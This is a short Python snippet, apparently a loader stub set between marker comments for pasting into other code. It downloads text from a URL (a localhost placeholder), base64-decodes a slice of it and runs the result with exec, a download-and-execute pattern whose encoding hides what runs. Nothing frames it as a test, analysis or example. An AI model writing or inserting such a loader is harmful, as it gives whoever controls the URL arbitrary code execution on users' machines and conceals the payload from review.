from base64 import b64decode
from requests import get
#-----#
source = "https://127.0.0.1/payload"
exec(b64decode(get(source).text[2:-2]))
#-----#
